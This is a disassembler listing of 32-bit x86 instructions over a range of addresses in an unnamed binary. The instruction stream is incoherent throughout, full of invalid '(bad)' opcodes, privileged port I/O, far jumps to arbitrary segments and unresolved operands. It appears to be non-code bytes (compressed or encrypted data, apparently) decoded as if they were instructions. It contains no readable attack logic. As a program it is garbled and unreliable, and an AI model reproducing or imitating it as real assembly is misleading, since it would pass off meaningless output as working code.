  41c98d:	cs mov edi,0xcb83668f
  41c993:	mov    ds:0x49b950b7,al
  41c998:	and    DWORD PTR [edx+0x3e5df1e6],ecx
  41c99e:	adc    bl,al
  41c9a0:	mov    ebp,eax
  41c9a2:	sar    DWORD PTR [ebx+0x1b],1
  41c9a5:	add    al,0x26
  41c9a7:	mov    cl,0x33
  41c9a9:	ss push ebx
  41c9ab:	mov    bl,0xae
  41c9ad:	dec    esi
  41c9ae:	addr16 lahf 
  41c9b0:	sbb    al,0x19
  41c9b2:	std    
  41c9b3:	stos   DWORD PTR es:[edi],eax
  41c9b4:	sbb    BYTE PTR [esi+0x14],ch
  41c9b7:	iret   
  41c9b8:	sbb    ah,BYTE PTR [ecx+0x43e9807e]
  41c9be:	mov    eax,ds:0x62eb48c6
  41c9c3:	push   0xffffff91
  41c9c5:	in     eax,dx
  41c9c6:	fucomi st,st(0)
  41c9c8:	cwde   
  41c9c9:	shr    BYTE PTR [edi-0x551590e2],0xc6
  41c9d0:	icebp  
  41c9d1:	xchg   ecx,eax
  41c9d2:	int    0x1c
  41c9d4:	sbb    eax,0xbc569c04
  41c9d9:	int    0xd6
  41c9db:	outs   dx,BYTE PTR ds:[esi]
  41c9dc:	mov    bl,0x6b
  41c9de:	mov    ?,WORD PTR [edx+eiz*2-0x29]
  41c9e2:	pop    eax
  41c9e3:	dec    esp
  41c9e4:	mov    ch,0x56
  41c9e6:	pushf  
  41c9e7:	retf   0x4c7e
  41c9ea:	outs   dx,DWORD PTR ds:[esi]
  41c9eb:	int3   
  41c9ec:	jle    0x41ca13
  41c9ee:	jecxz  0x41c9cd
  41c9f0:	call   0xa99d:0x79feefd5
  41c9f7:	add    eax,0xd2629cd1
  41c9fc:	test   al,0x96
  41c9fe:	dec    ebx
  41c9ff:	xor    DWORD PTR [eax-0x20bf27a0],0xfd012bd
  41ca09:	dec    bl
  41ca0b:	enter  0x7e04,0x99
  41ca0f:	add    ah,ch
  41ca11:	test   edx,ebp
  41ca13:	(bad)  
  41ca14:	cmp    ebp,DWORD PTR [eax-0x12]
  41ca17:	mov    edi,0xb7490fa0
  41ca1c:	mov    ebx,0xf71bd599
  41ca21:	leave  
  41ca22:	mov    dh,0xdd
  41ca24:	test   al,0xc0
  41ca26:	jno    0x41ca77
  41ca28:	push   ds
  41ca29:	sbb    al,0x99
  41ca2b:	pop    ds
  41ca2c:	pushf  
  41ca2d:	pop    eax
  41ca2e:	call   DWORD PTR [ecx+0x5f]
  41ca31:	leave  
  41ca32:	push   ecx
  41ca33:	clc    
  41ca34:	mov    cl,0xc9
  41ca36:	sub    al,0xb7
  41ca38:	ficomp DWORD PTR [edx]
  41ca3a:	ficom  DWORD PTR [eax-0x2a]
  41ca3d:	inc    esi
  41ca3e:	xchg   esp,eax
  41ca3f:	inc    ebp
  41ca40:	xchg   ecx,eax
  41ca41:	loopne 0x41ca8d
  41ca43:	pusha  
  41ca44:	(bad)  
  41ca46:	cmp    eax,0xa939e5a8
  41ca4b:	ud0    edi,DWORD PTR [eax+0x73]
  41ca4f:	sbb    al,0xf4
  41ca51:	lock out 0x3e,al
  41ca54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca55:	mov    ebx,0xa29862b6
  41ca5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca5b:	clc    
  41ca5c:	icebp  
  41ca5d:	ja     0x41ca2e
  41ca5f:	xlat   BYTE PTR ds:[ebx]
  41ca60:	out    0x27,eax
  41ca62:	or     ch,BYTE PTR [ecx+0x784671df]
  41ca68:	repz ffree st(4)
  41ca6b:	pop    es
  41ca6c:	mov    ebx,0xdc38e570
  41ca71:	lds    edx,FWORD PTR [esp+ebp*4-0xd]
  41ca75:	add    al,0x21
  41ca77:	cli    
  41ca78:	xchg   ecx,eax
  41ca79:	push   ebp
  41ca7a:	jb     0x41ca95
  41ca7c:	jno    0x41c9fe
  41ca7e:	daa    
  41ca7f:	or     esi,edx
  41ca81:	test   al,0xd3
  41ca83:	xchg   ecx,eax
  41ca84:	or     eax,0xb9212d13
  41ca89:	sbb    ch,BYTE PTR [edi]
  41ca8b:	(bad)  
  41ca8c:	fsub   DWORD PTR [esp+esi*1]
  41ca8f:	push   esi
  41ca90:	sub    BYTE PTR [esi-0x2a4320a2],0x42
  41ca97:	inc    ecx
  41ca98:	lds    esp,FWORD PTR [ebx+0x25503afd]
  41ca9e:	jmp    0xcee0:0xb567fe8f
  41caa5:	pusha  
  41caa6:	rol    DWORD PTR [esi],1
  41caa8:	in     al,dx
  41caa9:	jno    0x41cafa
  41caab:	hlt    
  41caac:	cmp    dl,BYTE PTR [edx]
  41caae:	push   es
  41caaf:	mov    cl,0xd2
  41cab1:	inc    edi
  41cab2:	jge    0x41ca76
  41cab4:	jge    0x41caea
  41cab6:	dec    eax
  41cab7:	data16 mov bh,0x73
  41caba:	xor    BYTE PTR [eax],ch
  41cabc:	pop    ebx
  41cabd:	mov    al,ds:0x94186a32
  41cac2:	outs   dx,BYTE PTR ds:[esi]
  41cac3:	imul   edx,DWORD PTR [edi-0xf723c33],0xe78be95c
  41cacd:	adc    cl,BYTE PTR [eax]
  41cacf:	inc    ecx
  41cad0:	sub    al,0x4d
  41cad2:	jp     0x41cb09
  41cad4:	pop    esp
  41cad5:	push   edx
  41cad6:	les    edx,FWORD PTR [esi-0x5d]
  41cad9:	hlt    
  41cada:	mov    edi,0x9fe1bcf
  41cadf:	add    BYTE PTR [eax+0x46],al
  41cae2:	jbe    0x41cb3a
  41cae4:	jl     0x41cb44
  41cae6:	push   ebx
  41cae7:	mov    al,ds:0x968cc7b2
  41caec:	inc    eax
  41caed:	jmp    0x41caa4
  41caef:	repz xor al,0xee
  41caf2:	aaa    
  41caf3:	popf   
  41caf4:	andnps xmm3,XMMWORD PTR [edi-0x49]
  41caf8:	sbb    al,0xc7
  41cafa:	sbb    bl,BYTE PTR [ecx]
  41cafc:	test   DWORD PTR [ecx+0x33],edx
  41caff:	sub    BYTE PTR [edx],0xd7
  41cb02:	pusha  
  41cb03:	out    0xb6,al
  41cb05:	inc    ecx
  41cb06:	mov    DWORD PTR [esp+ebx*8-0x7e],esp
  41cb0a:	leavew 
  41cb0c:	adc    esp,0x30
  41cb0f:	and    BYTE PTR [ebx+edi*2+0x5170f371],dh
  41cb16:	mov    DWORD PTR [edx+eax*4-0x27c1a910],ecx
  41cb1d:	bound  ecx,QWORD PTR es:0xc8147dd6
  41cb24:	in     eax,dx
  41cb25:	xchg   esp,eax
  41cb26:	mov    ecx,0x51d770b0
  41cb2b:	test   edx,esi
  41cb2d:	ret    
  41cb2e:	mov    al,0x52
  41cb30:	pop    edx
  41cb31:	or     DWORD PTR [esi+0x50],esp
  41cb34:	push   0x630f29bd
  41cb39:	push   0x6935047a
  41cb3e:	outs   dx,DWORD PTR ds:[esi]
  41cb3f:	push   ss
  41cb40:	arpl   WORD PTR [ebx+eax*8],bp
  41cb43:	(bad)  
  41cb45:	inc    ebx
  41cb46:	pop    ss
  41cb47:	hlt    
  41cb48:	bsr    edi,edi
  41cb4b:	push   edx
  41cb4c:	test   ah,ch
  41cb4e:	xchg   DWORD PTR [ebp+0x6ac69b58],edi
  41cb54:	retf   0x361
  41cb57:	and    al,dl
  41cb59:	inc    di
  41cb5b:	aad    0x51
  41cb5d:	jb     0x41cbd4
  41cb5f:	sahf   
  41cb60:	mov    ah,0x12
  41cb62:	pop    esp
  41cb63:	(bad)  
  41cb64:	push   ecx
  41cb65:	loope  0x41cb36
  41cb67:	jge    0x41cbd3
  41cb69:	scas   al,BYTE PTR es:[edi]
  41cb6a:	or     bh,al
  41cb6c:	fiadd  WORD PTR [ebp+0x7cec79e5]
  41cb72:	jg     0x41cbdd
  41cb74:	xchg   esi,eax
  41cb75:	xchg   esi,eax
  41cb76:	gs inc eax
  41cb78:	mov    al,0x4e
  41cb7a:	aaa    
  41cb7b:	in     al,dx
  41cb7c:	mov    al,0xeb
  41cb7e:	les    esp,FWORD PTR [edi+0x5a]
  41cb81:	cvtps2pd xmm5,QWORD PTR [edx-0x2e]
  41cb85:	push   ss
  41cb86:	cld    
  41cb87:	clc    
  41cb88:	jmp    0x41cbe0
  41cb8a:	jg     0x41cb0e
  41cb8c:	cs xchg ebx,ecx
  41cb8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb90:	mov    eax,ds:0x30ee823e
  41cb95:	sub    esp,DWORD PTR [edi+0x7d]
  41cb98:	sbb    eax,0xc88900bb
  41cb9d:	rcr    BYTE PTR [edx+0x6],1
  41cba0:	and    BYTE PTR [ebx+0x20],bl
  41cba3:	cs sti 
  41cba5:	fld    DWORD PTR [ebx]
  41cba7:	outs   dx,BYTE PTR ds:[esi]
  41cba8:	(bad)  
  41cba9:	pop    esp
  41cbaa:	xor    dh,bl
  41cbac:	push   ebp
  41cbad:	xor    al,0xec
  41cbaf:	add    BYTE PTR [ebx+0x1c6dcabd],0xbf
  41cbb6:	out    0x2e,al
  41cbb8:	lahf   
  41cbb9:	jae    0x41cbbe
  41cbbb:	ror    ah,0x85
  41cbbe:	cmp    esi,DWORD PTR ss:0xef08e81c
  41cbc5:	rol    DWORD PTR [esi+0x42e2a898],1
  41cbcb:	push   edi
  41cbcc:	jns    0x41cbba
  41cbce:	repnz cdq 
  41cbd0:	add    bl,ah
  41cbd2:	bound  edx,QWORD PTR [edx+0x4e654645]
  41cbd8:	and    al,0x5a
  41cbda:	(bad)  
  41cbdb:	imul   eax,DWORD PTR [esi+0x3d17db58],0x61
  41cbe2:	push   esi
  41cbe3:	xor    al,0x94
  41cbe5:	mov    esi,0xab2c97ae
  41cbea:	xchg   ebx,eax
  41cbeb:	nop
  41cbec:	add    edi,ecx
  41cbee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cbef:	pop    eax
  41cbf0:	(bad)  
  41cbf1:	pop    edi
  41cbf2:	repnz in eax,0xf3
  41cbf5:	xchg   esp,eax
  41cbf6:	test   eax,0xa2043397
  41cbfc:	fisub  WORD PTR ds:0x1f77d14e
  41cc02:	add    edi,eax
  41cc04:	jne    0x41cc2b
  41cc06:	hlt    
  41cc07:	pop    esp
  41cc08:	sub    al,0xc3
  41cc0a:	leave  
  41cc0b:	mov    al,0x4f
  41cc0d:	xchg   esi,eax
  41cc0e:	stos   DWORD PTR es:[edi],eax
  41cc0f:	popf   
  41cc10:	fidiv  DWORD PTR [eax-0x287ab79d]
  41cc16:	dec    eax
  41cc17:	fs push ecx
  41cc19:	mov    edi,0xcda28af4
  41cc1e:	mov    eax,ds:0xfa765b7c
  41cc23:	mov    cx,0x7282
  41cc27:	jmp    0x41cbf1
  41cc29:	pop    ecx
  41cc2a:	inc    edi
  41cc2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc2c:	(bad)  
  41cc2d:	lock jns 0x41cc59
  41cc30:	(bad)  
  41cc32:	imul   ebx,DWORD PTR [esi],0xb81d761d
  41cc38:	pop    es
  41cc39:	into   
  41cc3a:	shl    BYTE PTR [eax],cl
  41cc3c:	popf   
  41cc3d:	push   0xfffffff0
  41cc3f:	retfw  
  41cc41:	(bad)  
  41cc42:	jmp    0x41cc45
  41cc44:	cmc    
  41cc45:	push   esp
  41cc46:	xor    eax,0x157dc1a1
  41cc4b:	pop    ebx
  41cc4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc4d:	mov    al,0xa4
  41cc4f:	fcmovnbe st,st(6)
  41cc51:	sbb    eax,DWORD PTR [esi]
  41cc53:	pop    esp
  41cc54:	nop
  41cc55:	push   0x65
  41cc57:	retf   0xa3a2
  41cc5a:	cmp    DWORD PTR [ecx],0xffffffed
  41cc5d:	sar    ch,0x10
  41cc60:	popf   
  41cc61:	fisubr WORD PTR [eax+0x5c]
  41cc64:	in     al,dx
  41cc65:	sbb    bl,BYTE PTR [edx-0x64c08a98]
  41cc6b:	jle    0x41cca3
  41cc6d:	add    eax,0x352c8a4b
  41cc72:	mov    al,0xaa
  41cc74:	mov    al,0x94
  41cc77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc78:	mov    ebp,0x3d2d77cb
  41cc7d:	aad    0xef
  41cc7f:	pop    es
  41cc80:	add    al,cl
  41cc82:	lods   al,BYTE PTR ds:[esi]
  41cc83:	push   ecx
  41cc84:	inc    ecx
  41cc85:	hlt    
  41cc86:	push   esi
  41cc87:	inc    eax
  41cc88:	pop    eax
  41cc89:	adc    DWORD PTR [esi+0x709b72ca],edi
  41cc8f:	dec    edx
  41cc90:	push   edi
  41cc91:	mov    bl,ah
  41cc93:	stc    
  41cc94:	add    eax,0x2242b334
  41cc99:	mov    al,0xce
  41cc9b:	mov    cl,0x6c
  41cc9d:	add    DWORD PTR [edi-0x719552e9],esi
  41cca3:	inc    ebx
  41cca4:	dec    ebx
  41cca5:	jne    0x41cca3
  41cca7:	lahf   
  41cca8:	mov    cl,0xc2
  41ccaa:	jmp    0xda6c:0x6ab907e7
  41ccb1:	or     al,0xc7
  41ccb3:	xchg   ebp,eax
  41ccb4:	mov    al,ds:0x66f42727
  41ccb9:	iret   
  41ccba:	mov    edi,0xec75df89
  41ccbf:	dec    eax
  41ccc0:	cdq    
  41ccc1:	sbb    eax,0x32ddad66
  41ccc6:	pop    eax
  41ccc7:	xchg   esi,eax
  41ccc8:	leave  
  41ccc9:	mov    eax,ds:0xce9e383d
  41ccce:	stc    
  41cccf:	mov    esi,DWORD PTR ds:0x7835b597
  41ccd5:	and    al,0x23
  41ccd7:	mov    ebp,0xc3c86849
  41ccdc:	test   edx,ebx
  41ccde:	loopne 0x41ccdd
  41cce0:	call   0x9d448344
  41cce5:	mov    esp,0xf6349a9c
  41ccea:	scas   al,BYTE PTR es:[edi]
  41cceb:	js     0x41cd50
  41cced:	pop    ss
  41ccee:	out    0x30,eax
  41ccf0:	out    dx,al
  41ccf1:	dec    ebx
  41ccf2:	std    
  41ccf3:	xchg   DWORD PTR [ebx+0x52],ebx
  41ccf6:	mov    edx,0xdf6a8d8f
  41ccfb:	cs cmc 
  41ccfd:	mov    dl,0x28
  41ccff:	mov    cl,0x92
  41cd01:	js     0x41ccc0
  41cd03:	pop    esp
  41cd04:	rcl    BYTE PTR [edx-0x21],0x8d
  41cd08:	jmp    0xdbac:0xe10f9509
  41cd0f:	in     al,dx
  41cd10:	push   ss
  41cd11:	pop    es
  41cd12:	push   ds
  41cd13:	shr    cl,1
  41cd15:	retf   0x8f42
  41cd18:	mov    ecx,0x5bdf12e2
  41cd1d:	test   esi,edx
  41cd1f:	or     al,0x7a
  41cd21:	retf   0x7468
  41cd24:	jmp    0x41cd2b
  41cd26:	or     eax,0x24a4c09c
  41cd2b:	outs   dx,DWORD PTR ds:[esi]
  41cd2c:	ja     0x41cd76
  41cd2e:	js     0x41cd2c
  41cd30:	cdq    
  41cd31:	fstp   DWORD PTR [esi+0x31]
  41cd34:	push   eax
  41cd35:	and    ebp,DWORD PTR [edx]
  41cd37:	fs inc edi
  41cd39:	push   edi
  41cd3a:	push   ecx
  41cd3b:	sbb    edi,DWORD PTR [edx-0x58]
  41cd3e:	out    0x94,eax
  41cd40:	adc    al,ch
  41cd42:	sbb    DWORD PTR [edi*4-0x1d51b0a8],edx
  41cd49:	in     eax,dx
  41cd4a:	js     0x41cdc6
  41cd4c:	popa   
  41cd4d:	std    
  41cd4e:	push   ecx
  41cd4f:	cmp    al,0x40
  41cd51:	fadd   QWORD PTR [ebp+0x76]
  41cd54:	lahf   
  41cd55:	leave  
  41cd56:	dec    edx
  41cd57:	jb     0x41cd04
  41cd59:	ja     0x41cd57
  41cd5b:	jmp    0x75996719
  41cd60:	daa    
  41cd61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd62:	mov    ?,edi
  41cd64:	(bad)  
  41cd65:	arpl   WORD PTR [eax],sp
  41cd67:	push   ebx
  41cd68:	mov    BYTE PTR [ebx+ebp*4],0x38
  41cd6c:	cmp    DWORD PTR ds:0x7c255ea0,0x34
  41cd73:	ins    BYTE PTR es:[edi],dx
  41cd74:	cld    
  41cd75:	into   
  41cd76:	mov    ebx,0xe3de69c9
  41cd7b:	push   ecx
  41cd7c:	mov    ?,WORD PTR [edx+0x66dde239]
  41cd82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd83:	cdq    
  41cd84:	xor    eax,0x751162f3
  41cd89:	js     0x41cd29
  41cd8b:	into   
  41cd8c:	mov    ds:0xf829067e,eax
  41cd91:	fisub  DWORD PTR [edx+0x397af743]
  41cd97:	dec    eax
  41cd98:	jmp    0x8f73:0x30c6c44c
  41cd9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cda0:	out    dx,eax
  41cda1:	scas   al,BYTE PTR es:[edi]
  41cda2:	add    BYTE PTR [edi-0x68],bh
  41cda5:	ss jmp 0x159c1e42
  41cdab:	xchg   DWORD PTR [edx-0x38a1a95e],ebp
  41cdb1:	mov    ecx,0xb1a8b556
  41cdb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cdb7:	sbb    eax,0xa6baba47
  41cdbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cdbd:	mov    dl,BYTE PTR [edi+0xa2b58ae]
  41cdc3:	(bad)  
  41cdc4:	push   0xffffff92
  41cdc6:	or     BYTE PTR [eax],ah
  41cdc8:	push   ebp
  41cdc9:	(bad)  
  41cdca:	(bad)  
  41cdcb:	neg    BYTE PTR [edx]
  41cdcd:	test   eax,0x4a85e81a
  41cdd2:	push   edx
  41cdd3:	fadd   DWORD PTR [esi]
  41cdd5:	xchg   ebx,eax
  41cdd6:	push   cs
  41cdd7:	mov    al,ds:0xf5b4abc8
  41cddd:	aad    0x11
  41cddf:	add    eax,0xd91c4b2d
  41cde4:	outs   dx,DWORD PTR ds:[esi]
  41cde5:	xchg   esi,eax
  41cde6:	loope  0x41ce3b
  41cde8:	ins    DWORD PTR es:[edi],dx
  41cde9:	pop    es
  41cdea:	sbb    DWORD PTR [ecx+ebx*8],ecx
  41cded:	iret   
  41cdee:	xchg   BYTE PTR [edx+0x7eb0d154],ch
  41cdf4:	push   edi
  41cdf5:	mov    eax,0x8ab217db
  41cdfa:	sub    eax,0x277394bd
  41cdff:	rol    DWORD PTR [edi],cl
  41ce01:	or     BYTE PTR [ecx+0x51],0xe6
  41ce05:	jp     0x41cdac
  41ce07:	push   ss
  41ce08:	and    esp,DWORD PTR [edi-0x41]
  41ce0b:	frstor [eax+0x53]
  41ce0e:	and    DWORD PTR ds:0x3c0bda0f,0x666b3d02
  41ce18:	rol    DWORD PTR fs:[esi],cl
  41ce1b:	mov    bh,0x66
  41ce1d:	mov    esp,0x6851ca57
  41ce22:	mov    dl,0x6a
  41ce24:	pop    eax
  41ce25:	xchg   edi,eax
  41ce26:	mov    ds:0xbf0484e6,al
  41ce2b:	jae    0x41cea8
  41ce2d:	(bad)  
  41ce2e:	int    0x67
  41ce30:	(bad)  
  41ce31:	pop    ebx
  41ce32:	push   0xfe9c8ce7
  41ce37:	aas    
  41ce38:	scas   eax,DWORD PTR es:[edi]
  41ce39:	sub    al,0x3a
  41ce3b:	sahf   
  41ce3c:	or     BYTE PTR [ebx],dh
  41ce3e:	pushf  
  41ce3f:	ds pusha 
  41ce41:	cmp    ah,BYTE PTR [edx+0x4fc2c14d]
  41ce47:	lods   eax,DWORD PTR ds:[esi]
  41ce48:	xchg   esp,eax
  41ce49:	sbb    bl,BYTE PTR [ecx+0x65]
  41ce4c:	dec    eax
  41ce4d:	mov    BYTE PTR [esi-0x63833cb],bl
  41ce53:	(bad)  
  41ce54:	js     0x41ce87
  41ce56:	ror    BYTE PTR [eax],cl
  41ce58:	push   edi
  41ce59:	sti    
  41ce5a:	pop    esi
  41ce5b:	inc    ebx
  41ce5c:	scas   eax,DWORD PTR es:[edi]
  41ce5d:	int    0xd
  41ce5f:	in     al,0xc2
  41ce61:	aam    0x4f
  41ce63:	std    
  41ce64:	dec    ebp
  41ce65:	inc    edx
  41ce66:	rcr    dl,0x85
  41ce69:	ins    BYTE PTR es:[edi],dx
  41ce6a:	dec    ebx
  41ce6b:	pop    esp
  41ce6c:	fisub  WORD PTR [edx+0x4d3ef348]
  41ce72:	enter  0x9ea7,0xdf
  41ce76:	and    al,0x9c
  41ce78:	out    0x4c,al
  41ce7a:	js     0x41ce0a
  41ce7c:	fnsave [ebp-0x6d595e8e]
  41ce82:	add    BYTE PTR [edx],dl
  41ce84:	rol    BYTE PTR [edx-0x3a1f8f10],0x5e
  41ce8b:	mov    ecx,gs
  41ce8d:	clc    
  41ce8e:	pushf  
  41ce8f:	in     eax,dx
  41ce90:	xor    esi,DWORD PTR [ecx+esi*2+0x58]
  41ce94:	scas   al,BYTE PTR es:[edi]
  41ce95:	xlat   BYTE PTR ds:[ebx]
  41ce96:	es popf 
  41ce98:	xchg   ecx,eax
  41ce99:	jbe    0x41cf19
  41ce9b:	inc    ebp
  41ce9c:	arpl   dx,ax
  41ce9e:	repnz xor eax,0x6412d1e8
  41cea4:	sbb    dl,BYTE PTR [ebp-0x763f5a0a]
  41ceaa:	mov    dh,0xca
  41ceac:	mov    edx,0x88462822
  41ceb1:	dec    ecx
  41ceb2:	or     eax,0x45fc8990
  41ceb7:	push   0x2b
  41ceb9:	scas   al,BYTE PTR es:[edi]
  41ceba:	mov    ds:0xc2d90335,al
  41cebf:	das    
  41cec0:	js     0x41ce6d
  41cec2:	xlat   BYTE PTR ds:[ebx]
  41cec3:	and    al,0x42
  41cec5:	icebp  
  41cec6:	jge    0x41cf3e
  41cec8:	out    0x4e,eax
  41ceca:	test   eax,0x9a5a09b4
  41cecf:	ficom  DWORD PTR [esi+eiz*8+0x6a]
  41ced3:	mov    dl,0x3e
  41ced5:	inc    ebx
  41ced6:	mov    bl,0x81
  41ced8:	cmp    edi,DWORD PTR [eax+ecx*4+0x7f2dbe84]
  41cedf:	test   edx,ebp
  41cee1:	aaa    
  41cee2:	sub    dl,BYTE PTR [edi-0x16]
  41cee5:	jecxz  0x41cedc
  41cee7:	nop
  41cee8:	call   0xbb031f3
  41ceed:	ja     0x41ce99
  41ceef:	enter  0xebae,0x62
  41cef3:	jnp    0x41cef7
  41cef5:	and    BYTE PTR [edx-0x45909f47],ch
  41cefb:	stos   BYTE PTR es:[edi],al
  41cefc:	test   DWORD PTR [eax],ebx
  41cefe:	out    0xc9,al
  41cf00:	into   
  41cf01:	jp     0x41cf0a
  41cf03:	ss dec esi
  41cf05:	xor    eax,0x8d7f7776
  41cf0a:	imul   esp,DWORD PTR [esi-0x620e628d],0x2b
  41cf11:	dec    ebp
  41cf12:	pop    ds
  41cf13:	ret    0x3b01
  41cf16:	in     eax,dx
  41cf17:	fild   WORD PTR [eax-0x69]
  41cf1a:	loopne 0x41ced8
  41cf1c:	cli    
  41cf1d:	scas   eax,DWORD PTR es:[edi]
  41cf1e:	jecxz  0x41cf61
  41cf20:	repnz cmp bl,BYTE PTR [ebx]
  41cf23:	dec    esi
  41cf24:	sub    eax,0x8c049b26
  41cf29:	mov    eax,0x4563537f
  41cf2e:	push   ebp
  41cf2f:	pop    edx
  41cf30:	retf   
  41cf31:	push   ds
  41cf32:	lds    edx,FWORD PTR [esi]
  41cf34:	es ins DWORD PTR es:[edi],dx
  41cf36:	xchg   ebx,eax
  41cf37:	or     eax,0x3f029ca2
  41cf3c:	ror    BYTE PTR [edx],1
  41cf3e:	fistp  QWORD PTR [ecx+0x1f441646]
  41cf44:	rcl    BYTE PTR [ecx+0x36],0x99
  41cf48:	into   
  41cf49:	adc    BYTE PTR [edx+eiz*8+0x3a],bh
  41cf4d:	jmp    0x41cf5c
  41cf4f:	shr    DWORD PTR [eax+0x15465cd7],cl
  41cf55:	and    al,0xde
  41cf57:	inc    esi
  41cf58:	cwde   
  41cf59:	xchg   BYTE PTR [edx-0x79f65403],cl
  41cf5f:	push   0x62
  41cf61:	cld    
  41cf62:	push   gs
  41cf64:	inc    esi
  41cf65:	rcr    DWORD PTR [ebx-0x195dfcf],0x7d
  41cf6c:	mov    dh,al
  41cf6e:	stos   BYTE PTR es:[edi],al
  41cf6f:	les    esi,FWORD PTR [edi]
  41cf71:	adc    al,0x92
  41cf73:	aas    
  41cf74:	xchg   esp,eax
  41cf75:	outs   dx,DWORD PTR ds:[esi]
  41cf76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf77:	addr16 mov ds:0x575a,al
  41cf7b:	jae    0x41cf08
  41cf7d:	in     al,dx
  41cf7e:	sbb    al,0xa5
  41cf80:	jecxz  0x41cf32
  41cf82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf83:	cs addr16 pop ds
  41cf86:	arpl   WORD PTR [esi+0x72],sp
  41cf89:	imul   edx,DWORD PTR [ebx-0x5690b67],0xffffffb0
  41cf90:	icebp  
  41cf91:	cmp    BYTE PTR [ebx-0x7c],ch
  41cf94:	test   eax,0xacdba32
  41cf99:	and    al,0x8e
  41cf9b:	add    esi,DWORD PTR [ecx]
  41cf9d:	cmp    BYTE PTR [ecx],0xaa
  41cfa0:	inc    edi
  41cfa1:	ja     0x41cfe9
  41cfa3:	jbe    0x41d014
  41cfa5:	outs   dx,DWORD PTR ds:[esi]
  41cfa6:	popa   
  41cfa7:	pop    es
  41cfa8:	push   ecx
  41cfa9:	stos   DWORD PTR es:[edi],eax
  41cfaa:	es stos DWORD PTR es:[edi],eax
  41cfac:	mov    BYTE PTR [ebx],cl
  41cfae:	clc    
  41cfaf:	pop    es
  41cfb0:	mov    ah,dl
  41cfb2:	inc    eax
  41cfb3:	jp     0x41cf58
  41cfb5:	or     eax,DWORD PTR [edi-0x5d9fdeaa]
  41cfbb:	out    0x65,eax
  41cfbd:	sbb    eax,0xb0058c8f
  41cfc2:	fldcw  WORD PTR [eax+0x3b]
  41cfc5:	or     edx,edx
  41cfc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cfc8:	imul   BYTE PTR [edi*4+0x554e0463]
  41cfcf:	inc    ecx
  41cfd0:	aam    0x90
  41cfd2:	in     al,0xda
  41cfd4:	xor    eax,DWORD PTR [esi-0x317b3ebc]
  41cfda:	clc    
  41cfdb:	xor    al,0x14
  41cfdd:	das    
  41cfde:	inc    eax
  41cfdf:	adc    al,0xa1
  41cfe1:	rol    DWORD PTR [ecx-0x13],0x46
  41cfe5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cfe6:	stc    
  41cfe7:	pusha  
  41cfe8:	pop    edi
  41cfe9:	popf   
  41cfea:	into   
  41cfeb:	mov    eax,esi
  41cfed:	dec    eax
  41cfee:	or     ebx,ebx
  41cff0:	imul   edi,ecx,0xffffffc9
  41cff3:	add    eax,esp
  41cff5:	jb     0x41cff4
  41cff7:	and    eax,0xa499a6b5
  41cffc:	stos   DWORD PTR es:[edi],eax
  41cffd:	mov    WORD PTR [edx+0x6839dec7],?
  41d003:	arpl   WORD PTR [eax],cx
  41d005:	sbb    eax,0x82c487d3
  41d00a:	and    esp,DWORD PTR [edx]
  41d00c:	xchg   ebx,eax
  41d00d:	pop    ss
  41d00e:	sti    
  41d00f:	popf   
  41d010:	and    al,0xd7
  41d012:	sub    bh,BYTE PTR [ebx-0x416dced3]
  41d018:	sbb    BYTE PTR [edi+0x466be77c],bl
  41d01e:	icebp  
  41d01f:	sbb    edx,DWORD PTR [edi+edx*4-0x1]
  41d023:	lds    ecx,FWORD PTR [ebx]
  41d025:	mov    ebx,ebx
  41d027:	pop    ds
  41d028:	int    0xe8
  41d02a:	cs pop esi
  41d02c:	ss addr16 mov esi,0xe5c759f0
  41d033:	sbb    DWORD PTR [edi-0x7550bda4],esi
  41d039:	icebp  
  41d03a:	mov    ah,0x75
  41d03c:	sbb    al,0x36
  41d03e:	popa   
  41d03f:	sub    DWORD PTR [edx+edi*4-0x5ee75890],edi
  41d046:	ror    bh,0xcd
  41d049:	out    dx,eax
  41d04a:	gs je  0x41d051
  41d04d:	lea    ebx,[edi+0x8]
  41d050:	fiadd  WORD PTR [esp+edx*8+0x779328d4]
  41d057:	and    al,0x42
  41d059:	mov    edx,0xfc968533
  41d05e:	mov    ds:0x3f9527c0,al
  41d063:	mov    ch,0x1f
  41d065:	mov    eax,ds:0x3213489
  41d06a:	adc    al,0xc3
  41d06c:	imul   edx,DWORD PTR [edi+0x4083b463],0xffffffab
  41d073:	dec    ebp
  41d074:	xor    esp,0x7f
  41d077:	mov    ecx,0xa5d19fb0
  41d07c:	xchg   esp,eax
  41d07d:	add    edi,eax
  41d07f:	call   0x2f9d:0x7c6ba800
  41d086:	xor    ch,dl
  41d088:	stos   DWORD PTR es:[edi],eax
  41d089:	ins    BYTE PTR es:[edi],dx
  41d08a:	popf   
  41d08b:	aas    
  41d08c:	shl    dl,0x80
  41d08f:	or     ebx,eax
  41d091:	aad    0x3f
  41d093:	cmp    dh,ah
  41d095:	inc    eax
  41d096:	fcmovne st,st(2)
  41d098:	mov    dh,0x6a
  41d09a:	dec    ecx
  41d09b:	mov    eax,ds:0xa065e613
  41d0a0:	(bad)  
  41d0a1:	loope  0x41d102
  41d0a3:	mov    esi,0x310f9a14
  41d0a8:	or     esi,DWORD PTR [edi+0x11]
  41d0ab:	sbb    ch,al
  41d0ad:	push   ds
  41d0ae:	pop    esp
  41d0af:	add    BYTE PTR [eax],ch
  41d0b1:	and    DWORD PTR [edi+0x17],edi
  41d0b4:	jnp    0x41d0c3
  41d0b6:	repz test eax,0x5402ec2b
  41d0bc:	mov    esp,DWORD PTR [edi-0x23a3546]
  41d0c2:	aaa    
  41d0c3:	fcom   QWORD PTR [ebx-0x42875256]
